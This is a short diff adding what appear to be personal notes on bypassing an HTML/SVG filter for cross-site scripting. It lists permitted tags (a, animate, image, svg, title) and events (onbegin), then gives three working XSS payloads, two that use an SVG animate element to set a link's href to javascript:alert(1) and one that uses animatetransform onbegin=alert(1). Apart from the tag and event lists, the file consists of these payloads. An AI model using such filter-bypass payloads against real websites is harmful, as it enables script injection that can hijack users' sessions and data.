@@ -1,0 +1,21 @@
+allowed tags:
+
+a
+animate
+image
+svg
+title
+
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Here</text></a></svg>
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+tags:  animatetransform
+events:  onbegin
+tags:  image
+events:  onbegin
+tags:  svg
+events:  onbegin
+tags:  title
+events:  onbegin
+
+<svg><animatetransform onbegin=alert(1) ></svg>
